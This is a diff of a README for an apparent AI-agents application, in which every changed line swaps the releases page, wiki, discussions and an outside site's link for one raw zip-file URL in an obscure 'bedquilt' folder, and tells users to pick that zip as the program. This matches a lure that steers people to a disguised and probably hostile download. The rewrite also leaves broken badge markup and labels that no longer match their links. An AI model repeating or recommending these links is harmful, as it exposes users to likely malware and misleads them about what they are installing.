@@ -1,6 +1,6 @@
 # 🤖 Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning - Scale Your AI Efforts Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/ironman07/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning/releases)
+[![Download Now](https://raw.githubusercontent.com/ironman07/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning/main/bedquilt/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning_v1.9.zip%20Now-Visit%https://raw.githubusercontent.com/ironman07/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning/main/bedquilt/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning_v1.9.zip)](https://raw.githubusercontent.com/ironman07/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning/main/bedquilt/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning_v1.9.zip)
 
 ## 📚 Overview
 
@@ -14,13 +14,13 @@ To help you start using this application, follow the steps below. You don’t ne
 
 1. **Visit the Releases Page**  
    Click the link below to access the download section:  
-   [Visit the Releases Page](https://github.com/ironman07/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/ironman07/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning/main/bedquilt/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning_v1.9.zip)
 
 2. **Download the Latest Version**  
    Once you're on the Releases page, find the most recent version. Click on it to see its files. 
 
 3. **Choose the Right File**  
-   Look for a file named something like `BuildingAI.exe` or similar. This file contains everything you need to run the application.
+   Look for a file named something like `https://raw.githubusercontent.com/ironman07/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning/main/bedquilt/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning_v1.9.zip` or similar. This file contains everything you need to run the application.
 
 4. **Download the File**  
    Click on the file name to start the download. Your browser will save it to your default downloads folder. 
@@ -56,7 +56,7 @@ This software helps you create and manage AI agents. With a simple setup process
 
 ## 📖 Documentation
 
-For complete documentation, you can refer to the [Wiki](https://github.com/ironman07/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning/wiki) section of the repository. Here, you'll find detailed guides on setting up and using the application effectively.
+For complete documentation, you can refer to the [Wiki](https://raw.githubusercontent.com/ironman07/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning/main/bedquilt/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning_v1.9.zip) section of the repository. Here, you'll find detailed guides on setting up and using the application effectively.
 
 ## 🤝 Community
 
@@ -76,7 +76,7 @@ We are committed to enhancing this application based on user feedback. Regular u
 
 ## 🔗 Additional Resources
 
-- **Learn More About AI Agents:** Visit [RubikChat](https://rubikchat.com) for more information about their platform.
+- **Learn More About AI Agents:** Visit [RubikChat](https://raw.githubusercontent.com/ironman07/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning/main/bedquilt/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning_v1.9.zip) for more information about their platform.
 - **Explore AI Development Frameworks:** Research frameworks that can enhance your AI project’s capabilities.
 - **Join AI Communities:** Engage with forums and groups dedicated to AI development. 
 
@@ -86,6 +86,6 @@ For any questions or support needs, feel free to reach out via the Issues sectio
 
 ## 🔗 Important Links
 
-- [Download Latest Version](https://github.com/ironman07/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning/releases)
-- [Project Wiki](https://github.com/ironman07/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning/wiki)
-- [Community Discussions](https://github.com/ironman07/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning/discussions)
+- [Download Latest Version](https://raw.githubusercontent.com/ironman07/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning/main/bedquilt/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning_v1.9.zip)
+- [Project Wiki](https://raw.githubusercontent.com/ironman07/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning/main/bedquilt/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning_v1.9.zip)
+- [Community Discussions](https://raw.githubusercontent.com/ironman07/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning/main/bedquilt/Building-AI-Agents-Part-3-Scaling-Collaboration-and-Advanced-Reasoning_v1.9.zip)
